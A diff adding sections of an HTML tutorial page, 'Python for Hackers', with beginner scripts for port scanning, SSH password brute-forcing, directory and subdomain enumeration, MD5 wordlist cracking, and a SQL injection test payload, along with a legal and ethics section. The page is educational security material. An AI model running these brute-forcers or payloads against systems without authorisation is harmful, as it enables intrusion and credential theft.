+        <p>
+            These libraries will supercharge your hacking scripts. Install them with <code>pip install &lt;name&gt;</code>.
+        </p>
+
+        <div class="tool-grid">
+            <div class="tool-card">
+                <div class="tool-name"><span class="ico">🌐</span>requests</div>
+                <p>Simplest way to make HTTP requests. Perfect for web scraping, API hacking, and fuzzing.</p>
+            </div>
+            <div class="tool-card">
+                <div class="tool-name"><span class="ico">🐍</span>scapy</div>
+                <p>Packet crafting and manipulation. Build custom packets, sniff traffic, ARP spoofing.</p>
+            </div>
+            <div class="tool-card">
+                <div class="tool-name"><span class="ico">🔗</span>paramiko</div>
+                <p>SSH client library. Automate SSH commands, SFTP transfers, and brute-forcing.</p>
+            </div>
+            <div class="tool-card">
+                <div class="tool-name"><span class="ico">💥</span>impacket</div>
+                <p>Windows network protocols. SMB, MSRPC, Kerberos exploitation toolkit.</p>
+            </div>
+            <div class="tool-card">
+                <div class="tool-name"><span class="ico">🕸️</span>beautifulsoup4</div>
+                <p>HTML/XML parser for web scraping. Extract links, forms, and data easily.</p>
+            </div>
+            <div class="tool-card">
+                <div class="tool-name"><span class="ico">🔍</span>python-nmap</div>
+                <p>Python wrapper for Nmap. Run scans programmatically and parse results.</p>
+            </div>
+            <div class="tool-card">
+                <div class="tool-name"><span class="ico">🔐</span>cryptography</div>
+                <p>Modern crypto library. Encrypt, decrypt, sign, verify, hash.</p>
+            </div>
+            <div class="tool-card">
+                <div class="tool-name"><span class="ico">🌍</span>selenium</div>
+                <p>Browser automation. Test web apps, scrape JavaScript-heavy sites.</p>
+            </div>
+            <div class="tool-card">
+                <div class="tool-name"><span class="ico">📡</span>pwntools</div>
+                <p>CTF and exploit development framework. Buffer overflows, ROP chains.</p>
+            </div>
+            <div class="tool-card">
+                <div class="tool-name"><span class="ico">📊</span>pandas</div>
+                <p>Data analysis. Parse logs, analyze scan results, generate reports.</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- ===== 10 SCRIPTS ===== -->
+    <section class="section" id="scripts">
+        <span class="section-number">10 · REAL SCRIPTS</span>
+        <h2 class="section-title">
+            <span class="icon">⚙️</span>
+            Real Hacking Scripts
+        </h2>
+
+        <h3>Script 1: TCP Port Scanner</h3>
+        <div class="code-block" data-lang="python">
+<code><span class="kw">import</span> socket
+<span class="kw">import</span> sys
+<span class="kw">from</span> datetime <span class="kw">import</span> datetime
+
+<span class="kw">def</span> <span class="fn">scan_port</span>(host, port):
+    <span class="kw">try</span>:
+        s = socket.<span class="fn">socket</span>(socket.AF_INET, socket.SOCK_STREAM)
+        s.<span class="fn">settimeout</span>(<span class="num">1</span>)
+        result = s.<span class="fn">connect_ex</span>((host, port))
+        <span class="kw">if</span> result == <span class="num">0</span>:
+            <span class="kw">try</span>:
+                s.<span class="fn">send</span>(<span class="str">b"HEAD / HTTP/1.0\r\n\r\n"</span>)
+                banner = s.<span class="fn">recv</span>(<span class="num">1024</span>).<span class="fn">decode</span>().<span class="fn">strip</span>()
+            <span class="kw">except</span>:
+                banner = <span class="str">""</span>
+            <span class="fn">print</span>(<span class="str">f"[+] Port <span class="var">{port}</span> OPEN <span class="var">{banner}</span>"</span>)
+        s.<span class="fn">close</span>()
+    <span class="kw">except</span>:
+        <span class="kw">pass</span>
+
+<span class="kw">if</span> __name__ == <span class="str">"__main__"</span>:
+    target = sys.argv[<span class="num">1</span>] <span class="kw">if</span> <span class="fn">len</span>(sys.argv) &gt; <span class="num">1</span> <span class="kw">else</span> <span class="str">"127.0.0.1"</span>
+    <span class="fn">print</span>(<span class="str">f"Scanning <span class="var">{target}</span>... started at <span class="var">{datetime.now()}</span>"</span>)
+    <span class="kw">for</span> port <span class="kw">in</span> <span class="fn">range</span>(<span class="num">1</span>, <span class="num">1025</span>):
+        <span class="fn">scan_port</span>(target, port)
+    <span class="fn">print</span>(<span class="str">"Scan complete."</span>)</code>
+        </div>
+
+        <h3>Script 2: SSH Brute-Forcer (with Paramiko)</h3>
+        <div class="code-block" data-lang="python">
+<code><span class="cmt"># pip install paramiko</span>
+<span class="kw">import</span> paramiko
+
+<span class="kw">def</span> <span class="fn">try_ssh</span>(host, user, password):
+    client = paramiko.<span class="fn">SSHClient</span>()
+    client.<span class="fn">set_missing_host_key_policy</span>(paramiko.AutoAddPolicy())
+    <span class="kw">try</span>:
+        client.<span class="fn">connect</span>(host, username=user, password=password, timeout=<span class="num">3</span>)
+        <span class="kw">return</span> <span class="kw">True</span>
+    <span class="kw">except</span> paramiko.AuthenticationException:
+        <span class="kw">return</span> <span class="kw">False</span>
+    <span class="kw">except</span> Exception:
+        <span class="kw">return</span> <span class="kw">False</span>
+    <span class="kw">finally</span>:
+        client.<span class="fn">close</span>()
+
+<span class="var">host</span> = <span class="str">"192.168.1.1"</span>
+<span class="var">user</span> = <span class="str">"admin"</span>
+
+<span class="kw">with</span> <span class="fn">open</span>(<span class="str">"passwords.txt"</span>) <span class="kw">as</span> f:
+    <span class="kw">for</span> pw <span class="kw">in</span> f:
+        pw = pw.<span class="fn">strip</span>()
+        <span class="kw">if</span> <span class="fn">try_ssh</span>(host, user, pw):
+            <span class="fn">print</span>(<span class="str">f"[+] FOUND: <span class="var">{user}</span>:<span class="var">{pw}</span>"</span>)
+            <span class="kw">break</span>
+        <span class="kw">else</span>:
+            <span class="fn">print</span>(<span class="str">f"[-] Failed: <span class="var">{pw}</span>"</span>)</code>
+        </div>
+
+        <h3>Script 3: Directory Brute-Forcer</h3>
+        <div class="code-block" data-lang="python">
+<code><span class="kw">import</span> requests
+
+<span class="var">url</span> = <span class="str">"http://target.com"</span>
+<span class="var">wordlist</span> = <span class="str">"/usr/share/wordlists/dirb/common.txt"</span>
+
+<span class="kw">with</span> <span class="fn">open</span>(wordlist) <span class="kw">as</span> f:
+    <span class="kw">for</span> line <span class="kw">in</span> f:
+        path = line.<span class="fn">strip</span>()
+        <span class="kw">if</span> <span class="kw">not</span> path:
+            <span class="kw">continue</span>
+        full = <span class="str">f"<span class="var">{url}</span>/<span class="var">{path}</span>"</span>
+        <span class="kw">try</span>:
+            r = requests.<span class="fn">get</span>(full, timeout=<span class="num">3</span>, allow_redirects=<span class="kw">False</span>)
+            <span class="kw">if</span> r.status_code != <span class="num">404</span>:
+                <span class="fn">print</span>(<span class="str">f"[+] <span class="var">{r.status_code}</span> — <span class="var">{full}</span>"</span>)
+        <span class="kw">except</span> requests.RequestException:
+            <span class="kw">pass</span></code>
+        </div>
+
+        <h3>Script 4: Subdomain Enumerator</h3>
+        <div class="code-block" data-lang="python">
+<code><span class="kw">import</span> requests
+
+<span class="var">domain</span> = <span class="str">"example.com"</span>
+<span class="var">subs</span> = [<span class="str">"www"</span>, <span class="str">"mail"</span>, <span class="str">"api"</span>, <span class="str">"dev"</span>, <span class="str">"admin"</span>, <span class="str">"test"</span>, <span class="str">"ftp"</span>, <span class="str">"blog"</span>]
+
+<span class="kw">for</span> sub <span class="kw">in</span> subs:
+    url = <span class="str">f"http://<span class="var">{sub}</span>.<span class="var">{domain}</span>"</span>
+    <span class="kw">try</span>:
+        r = requests.<span class="fn">get</span>(url, timeout=<span class="num">3</span>)
+        <span class="fn">print</span>(<span class="str">f"[+] Found: <span class="var">{url}</span> → <span class="var">{r.status_code}</span>"</span>)
+    <span class="kw">except</span> requests.RequestException:
+        <span class="kw">pass</span></code>
+        </div>
+
+        <h3>Script 5: Hash Cracker</h3>
+        <div class="code-block" data-lang="python">
+<code><span class="kw">import</span> hashlib
+
+<span class="var">target_hash</span> = <span class="str">"5f4dcc3b5aa765d61d8327deb882cf99"</span>  <span class="cmt"># md5("password")</span>
+<span class="var">wordlist</span> = <span class="str">"/usr/share/wordlists/rockyou.txt"</span>
+
+<span class="kw">with</span> <span class="fn">open</span>(wordlist, errors=<span class="str">"ignore"</span>) <span class="kw">as</span> f:
+    <span class="kw">for</span> word <span class="kw">in</span> f:
+        word = word.<span class="fn">strip</span>()
+        h = hashlib.<span class="fn">md5</span>(word.<span class="fn">encode</span>()).<span class="fn">hexdigest</span>()
+        <span class="kw">if</span> h == target_hash:
+            <span class="fn">print</span>(<span class="str">f"[+] CRACKED: <span class="var">{word}</span>"</span>)
+            <span class="kw">break</span></code>
+        </div>
+    </section>
+
+    <!-- ===== 11 WEB ===== -->
+    <section class="section" id="web">
+        <span class="section-number">11 · WEB HACKING</span>
+        <h2 class="section-title">
+            <span class="icon">🕸️</span>
+            Web Hacking with Python
+        </h2>
+        <p>
+            The <code>requests</code> library makes HTTP hacking incredibly easy. Here's how to interact with web apps programmatically.
+        </p>
+
+        <div class="code-block" data-lang="python">
+<code><span class="kw">import</span> requests
+
+<span class="cmt"># Basic GET request</span>
+r = requests.<span class="fn">get</span>(<span class="str">"https://target.com"</span>)
+<span class="fn">print</span>(r.status_code)
+<span class="fn">print</span>(r.headers)
+
+<span class="cmt"># Custom headers (User-Agent spoofing)</span>
+headers = {<span class="str">"User-Agent"</span>: <span class="str">"Mozilla/5.0 (Hacker)"</span>}
+r = requests.<span class="fn">get</span>(<span class="str">"https://target.com"</span>, headers=headers)
+
+<span class="cmt"># POST request (login form)</span>
+data = {<span class="str">"username"</span>: <span class="str">"admin"</span>, <span class="str">"password"</span>: <span class="str">"test"</span>}
+r = requests.<span class="fn">post</span>(<span class="str">"https://target.com/login"</span>, data=data)
+
+<span class="cmt"># Using a session (keeps cookies)</span>
+s = requests.<span class="fn">Session</span>()
+s.<span class="fn">post</span>(<span class="str">"https://target.com/login"</span>, data=data)
+r = s.<span class="fn">get</span>(<span class="str">"https://target.com/dashboard"</span>)
+
+<span class="cmt"># SQL injection test</span>
+payload = <span class="str">"' OR '1'='1"</span>
+r = requests.<span class="fn">get</span>(<span class="str">f"https://target.com/page.php?id=<span class="var">{payload}</span>"</span>)
+
+<span class="cmt"># Ignore SSL errors (for self-signed certs)</span>
+r = requests.<span class="fn">get</span>(<span class="str">"https://target.com"</span>, verify=<span class="kw">False</span>)
+
+<span class="cmt"># Use a proxy (Burp Suite)</span>
+proxies = {<span class="str">"http"</span>: <span class="str">"http://127.0.0.1:8080"</span>, <span class="str">"https"</span>: <span class="str">"http://127.0.0.1:8080"</span>}
+r = requests.<span class="fn">get</span>(<span class="str">"https://target.com"</span>, proxies=proxies, verify=<span class="kw">False</span>)</code>
+        </div>
+
+        <h3>Web Scraping with BeautifulSoup</h3>
+        <div class="code-block" data-lang="python">
+<code><span class="cmt"># pip install beautifulsoup4</span>
+<span class="kw">import</span> requests
+<span class="kw">from</span> bs4 <span class="kw">import</span> BeautifulSoup
+
+r = requests.<span class="fn">get</span>(<span class="str">"https://target.com"</span>)
+soup = <span class="fn">BeautifulSoup</span>(r.text, <span class="str">"html.parser"</span>)
+
+<span class="cmt"># Extract all links</span>
+<span class="kw">for</span> link <span class="kw">in</span> soup.<span class="fn">find_all</span>(<span class="str">"a"</span>):
+    href = link.<span class="fn">get</span>(<span class="str">"href"</span>)
+    <span class="kw">if</span> href:
+        <span class="fn">print</span>(href)
+
+<span class="cmt"># Find all forms (potential login pages)</span>
+<span class="kw">for</span> form <span class="kw">in</span> soup.<span class="fn">find_all</span>(<span class="str">"form"</span>):
+    <span class="fn">print</span>(form.<span class="fn">get</span>(<span class="str">"action"</span>))
+
+<span class="cmt"># Extract all emails</span>
+<span class="kw">import</span> re
+emails = re.<span class="fn">findall</span>(<span class="str">r"[\w\.-]+@[\w\.-]+\.\w+"</span>, r.text)
+<span class="fn">print</span>(<span class="fn">set</span>(emails))</code>
+        </div>
+    </section>
+
+    <!-- ===== 12 CRYPTO ===== -->
+    <section class="section" id="crypto">
+        <span class="section-number">12 · CRYPTOGRAPHY</span>
+        <h2 class="section-title">
+            <span class="icon">🔐</span>
+            Cryptography &amp; Hashing
+        </h2>
+        <p>
+            Python's <code>hashlib</code> and <code>cryptography</code> libraries give you powerful crypto tools — for cracking, encoding, and building secure systems.
+        </p>
+
+        <h3>Hashing</h3>
+        <div class="code-block" data-lang="python">
+<code><span class="kw">import</span> hashlib
+
+<span class="var">data</span> = <span class="str">"password123"</span>.<span class="fn">encode</span>()
+
+<span class="fn">print</span>(hashlib.<span class="fn">md5</span>(data).<span class="fn">hexdigest</span>())
+<span class="fn">print</span>(hashlib.<span class="fn">sha1</span>(data).<span class="fn">hexdigest</span>())
+<span class="fn">print</span>(hashlib.<span class="fn">sha256</span>(data).<span class="fn">hexdigest</span>())
+<span class="fn">print</span>(hashlib.<span class="fn">sha512</span>(data).<span class="fn">hexdigest</span>())</code>
+        </div>
+
+        <h3>Base64 Encoding</h3>
+        <div class="code-block" data-lang="python">
+<code><span class="kw">import</span> base64
+
+<span class="cmt"># Encode</span>
+encoded = base64.<span class="fn">b64encode</span>(<span class="str">b"admin:password"</span>)
+<span class="fn">print</span>(encoded)  <span class="cmt"># b'YWRtaW46cGFzc3dvcmQ='</span>
+
+<span class="cmt"># Decode</span>
+decoded = base64.<span class="fn">b64decode</span>(encoded)
+<span class="fn">print</span>(decoded)  <span class="cmt"># b'admin:password'</span>
+
+<span class="cmt"># URL-safe Base64</span>
+base64.<span class="fn">urlsafe_b64encode</span>(<span class="str">b"data"</span>)</code>
+        </div>
+
+        <h3>XOR Encryption</h3>
+        <div class="code-block" data-lang="python">
+<code><span class="kw">def</span> <span class="fn">xor_encrypt</span>(data, key):
+    <span class="kw">return</span> <span class="fn">bytes</span>([b ^ key <span class="kw">for</span> b <span class="kw">in</span> data])
+
+<span class="var">plaintext</span> = <span class="str">b"Secret message"</span>
+<span class="var">key</span> = <span class="num">42</span>
+
+<span class="var">encrypted</span> = <span class="fn">xor_encrypt</span>(plaintext, key)
+<span class="fn">print</span>(encrypted)
+
+<span class="cmt"># XOR is symmetric — same operation decrypts</span>
+<span class="var">decrypted</span> = <span class="fn">xor_encrypt</span>(encrypted, key)
+<span class="fn">print</span>(decrypted.<span class="fn">decode</span>())</code>
+        </div>
+    </section>
+
+    <!-- ===== 13 USE CASES ===== -->
+    <section class="section" id="usecases">
+        <span class="section-number">13 · USE CASES</span>
+        <h2 class="section-title">
+            <span class="icon">🎯</span>
+            Where Python Shines in Hacking
+        </h2>
+        <div class="use-grid">
+            <div class="use-card">
+                <span class="use-icon">🔎</span>
+                <h4>Recon Automation</h4>
+                <p>Scrape WHOIS, enumerate subdomains, gather OSINT from APIs.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">🌐</span>
+                <h4>Custom Scanners</h4>
+                <p>Build port scanners, vulnerability scanners, and fuzzers from scratch.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">💥</span>
+                <h4>Exploit Development</h4>
+                <p>Craft buffer overflows, ROP chains, shellcode with pwntools.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">🔐</span>
+                <h4>Password Cracking</h4>
+                <p>Custom hash crackers, wordlist generators, and brute-forcers.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">🕸️</span>
+                <h4>Web Exploitation</h4>
+                <p>Automate SQL injection, XSS, SSRF, and directory brute-forcing.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">📡</span>
+                <h4>Network Attacks</h4>
+                <p>ARP spoofing, DNS poisoning, packet sniffing with Scapy.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">🤖</span>
+                <h4>Malware Analysis</h4>
+                <p>Parse PE headers, extract strings, automate sandbox analysis.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">📊</span>
+                <h4>Report Generation</h4>
+                <p>Format scan results into PDF/HTML reports automatically.</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- ===== 14 BEST ===== -->
+    <section class="section" id="best">
+        <span class="section-number">14 · BEST PRACTICES</span>
+        <h2 class="section-title">
+            <span class="icon">✅</span>
+            Best Practices for Hacking Scripts
+        </h2>
+        <ol>
+            <li><strong>Use virtual environments</strong> — <code>python3 -m venv venv</code> isolates dependencies.</li>
+            <li><strong>Handle exceptions</strong> — Wrap network calls in try/except to prevent crashes.</li>
+            <li><strong>Add timeouts</strong> — Never let a socket hang forever. Use <code>settimeout()</code>.</li>
+            <li><strong>Use threading for speed</strong> — <code>ThreadPoolExecutor</code> for parallel scans.</li>
+            <li><strong>Log everything</strong> — Write results to file for later analysis.</li>
+            <li><strong>Validate input</strong> — Never trust user input, sanitize before use.</li>
+            <li><strong>Comment your code</strong> — Future you will thank you.</li>
+            <li><strong>Follow PEP 8</strong> — Python's style guide makes code readable.</li>
+            <li><strong>Use argparse</strong> — For clean command-line argument handling.</li>
+            <li><strong>Test in a lab</strong> — Always use legal environments (TryHackMe, HTB).</li>
+        </ol>
+
+        <h3>Virtual Environment Setup</h3>
+        <div class="code-block" data-lang="bash">
+<code><span class="cmt"># Create virtual environment</span>
+python3 -m venv hacker_env
+
+<span class="cmt"># Activate it</span>
+<span class="kw">source</span> hacker_env/bin/activate
+
+<span class="cmt"># Install packages</span>
+pip install requests scapy paramiko
+
+<span class="cmt"># Deactivate when done</span>
+deactivate</code>
+        </div>
+
+        <h3>Using argparse for CLI</h3>
+        <div class="code-block" data-lang="python">
+<code><span class="kw">import</span> argparse
+
+parser = argparse.<span class="fn">ArgumentParser</span>(description=<span class="str">"Port Scanner"</span>)
+parser.<span class="fn">add_argument</span>(<span class="str">"target"</span>, help=<span class="str">"Target IP address"</span>)
+parser.<span class="fn">add_argument</span>(<span class="str">"-p"</span>, <span class="str">"--ports"</span>, default=<span class="str">"1-1024"</span>, help=<span class="str">"Port range"</span>)
+parser.<span class="fn">add_argument</span>(<span class="str">"-v"</span>, <span class="str">"--verbose"</span>, action=<span class="str">"store_true"</span>)
+
+args = parser.<span class="fn">parse_args</span>()
+<span class="fn">print</span>(<span class="str">f"Target: <span class="var">{args.target}</span>, Ports: <span class="var">{args.ports}</span>"</span>)</code>
+        </div>
+    </section>
+
+    <!-- ===== 15 LEGAL ===== -->
+    <section class="section" id="legal">
+        <span class="section-number">15 · LEGAL &amp; ETHICS</span>
+        <h2 class="section-title">
+            <span class="icon">⚖️</span>
+            Legal &amp; Ethical Boundaries
+        </h2>
+        <div class="callout warn">
+            <strong>⚠️ Critical Warning:</strong> Writing a hacking script is legal. <strong>Using it against systems you don't own or have permission to test is a crime.</strong> Unauthorized access can lead to imprisonment, fines, and a permanent criminal record.
+        </div>
+
+        <h3>Legal Practice Environments</h3>
+        <div class="tool-grid">
+            <div class="tool-card">
+                <div class="tool-name"><span class="ico">🧪</span>TryHackMe</div>
+                <p>Beginner-friendly, guided labs for learning ethical hacking.</p>
+            </div>
+            <div class="tool-card">
+                <div class="tool-name"><span class="ico">🎯</span>Hack The Box</div>
+                <p>Realistic vulnerable machines. Excellent for intermediate learners.</p>
+            </div>
+            <div class="tool-card">
+                <div class="tool-name"><span class="ico">💀</span>VulnHub</div>
+                <p>Downloadable vulnerable VMs. Run them locally in VirtualBox.</p>
+            </div>
+            <div class="tool-card">
+                <div class="tool-name"><span class="ico">🐐</span>OWASP Juice Shop</div>
+                <p>Modern vulnerable web app. Practice web exploitation legally.</p>
+            </div>
+            <div class="tool-card">
+                <div class="tool-name"><span class="ico">🕸️</span>DVWA</div>
+                <p>Damn Vulnerable Web App. Classic for learning web attacks.</p>
+            </div>
+            <div class="tool-card">
+                <div class="tool-name"><span class="ico">☁️</span>Cloud Labs</div>
+                <p>Spin up your own VMs on AWS, Azure, or GCP.</p>
             </div>
         </div>
 
-    </div>
+        <div class="callout info">
+            <strong>💡 Ethical Hacker's Oath:</strong> With great power comes great responsibility. Your skills should protect, not harm. Always operate within legal and ethical boundaries.
+        </div>
+    </section>
+
+    <!-- ===== 16 CONCLUSION ===== -->
+    <section class="section" id="conclusion">
+        <span class="section-number">16 · CONCLUSION</span>
+        <h2 class="section-title">
+            <span class="icon">🎓</span>
+            Final Thoughts
+        </h2>
+        <p>
+            Python is the <strong>single most valuable programming language</strong> for ethical hackers. Its combination of simplicity, power, and a massive security library ecosystem makes it the language of choice for everyone from beginners to elite red teamers.
+        </p>
+        <p>
+            The journey from beginner to expert follows a clear path:
+        </p>
+        <ol>
+            <li><strong>Learn the basics</strong> — variables, loops, functions, files.</li>
+            <li><strong>Master the libraries</strong> — requests, socket, scapy, paramiko.</li>
+            <li><strong>Build small tools</strong> — port scanners, brute-forcers, scrapers.</li>
+            <li><strong>Read others' code</strong> — study open-source exploits on GitHub.</li>
+            <li><strong>Practice daily</strong> — TryHackMe, HackTheBox, and CTFs.</li>
+            <li><strong>Build a portfolio</strong> — share your tools on GitHub.</li>
+        </ol>
+        <p>
+            Remember: the terminal is your weapon, and Python is your language. Master it, and you'll be able to build <strong>custom tooling that rivals commercial products</strong> — all with clean, readable code.
+        </p>
+        <div class="callout">
+            <strong>🚀 Next Steps:</strong> Pick one script from this guide, type it out (don't copy-paste!), and run it against a vulnerable VM. Then modify it. Then write your own. Within weeks, Python will be second nature.
+        </div>
+        <p style="text-align:center; margin-top: 30px; font-size: 17px; color: #00ff88; font-weight: 600;">
+            Happy hacking — ethically. 🐍
+        </p>
+    </section>
+
+    <!-- ===== FOOTER ===== -->
+    <footer class="page-footer">
+        <p>© 2025 · <span class="brand">⚡ cyber·sume</span> · Python for Hackers</p>
+        <p style="margin-top: 8px; font-size: 12px;">Complete Guide · Beginner to Advanced · Updated 2025</p>
+    </footer>
 
 </div>
+
+</body>
+</html>
